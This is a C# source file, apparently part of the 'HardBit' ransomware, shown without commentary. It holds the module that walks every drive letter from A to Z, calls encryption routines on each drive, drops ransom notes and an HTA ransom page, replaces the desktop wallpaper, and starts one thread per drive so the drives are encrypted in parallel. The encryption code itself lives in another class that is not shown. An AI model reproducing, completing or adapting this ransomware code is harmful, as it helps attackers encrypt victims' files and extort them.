﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Threading;


namespace HardBit
{
  public class Class02
  {
    public static string base64Image = <HARDBIT.JPG.B64>;

    public static void Drive_A()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("A:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_B()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("B:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_C()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("C:\\"))
          {
            Class01.EncryptDriveC();
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
        Class01.SetWallpaper(Class02.base64Image);
        Class01.HTA();
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_D()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("D:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_E()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("E:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_F()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("F:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_J()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("J:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_H()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("H:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_I()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("I:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_G()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("J:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_K()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("K:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_L()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("L:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_M()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("M:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_N()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("N:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_O()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("O:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_P()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("P:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_R()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("R:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_S()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("S:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_T()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("T:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_Q()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("Q:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_U()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("U:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_V()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("V:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_W()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("W:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_X()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("X:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_Y()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("y:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Drive_Z()
    {
      try
      {
        string[] logicalDrives = Directory.GetLogicalDrives();
        int index = 0;
        while (index < logicalDrives.Length)
        {
          string str = logicalDrives[index];
          if (str.Contains("Z:\\"))
          {
            Class01.EncryptPath(str);
            Class01.HTA(str);
          }
          Class01.ExtractRansomNote(str);
          checked { index += 1; }
        }
      }
      catch (UnauthorizedAccessException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void EncryptDrives()
    {
      new Thread(new ThreadStart(Class02.Drive_A)).Start();
      new Thread(new ThreadStart(Class02.Drive_B)).Start();
      new Thread(new ThreadStart(Class02.Drive_C)).Start();
      new Thread(new ThreadStart(Class02.Drive_D)).Start();
      new Thread(new ThreadStart(Class02.Drive_E)).Start();
      new Thread(new ThreadStart(Class02.Drive_F)).Start();
      new Thread(new ThreadStart(Class02.Drive_G)).Start();
      new Thread(new ThreadStart(Class02.Drive_H)).Start();
      new Thread(new ThreadStart(Class02.Drive_I)).Start();
      new Thread(new ThreadStart(Class02.Drive_J)).Start();
      new Thread(new ThreadStart(Class02.Drive_K)).Start();
      new Thread(new ThreadStart(Class02.Drive_L)).Start();
      new Thread(new ThreadStart(Class02.Drive_M)).Start();
      new Thread(new ThreadStart(Class02.Drive_N)).Start();
      new Thread(new ThreadStart(Class02.Drive_O)).Start();
      new Thread(new ThreadStart(Class02.Drive_P)).Start();
      new Thread(new ThreadStart(Class02.Drive_R)).Start();
      new Thread(new ThreadStart(Class02.Drive_S)).Start();
      new Thread(new ThreadStart(Class02.Drive_T)).Start();
      new Thread(new ThreadStart(Class02.Drive_Q)).Start();
      new Thread(new ThreadStart(Class02.Drive_U)).Start();
      new Thread(new ThreadStart(Class02.Drive_V)).Start();
      new Thread(new ThreadStart(Class02.Drive_W)).Start();
      new Thread(new ThreadStart(Class02.Drive_X)).Start();
      new Thread(new ThreadStart(Class02.Drive_Y)).Start();
      new Thread(new ThreadStart(Class02.Drive_Z)).Start();
    }
  }
}
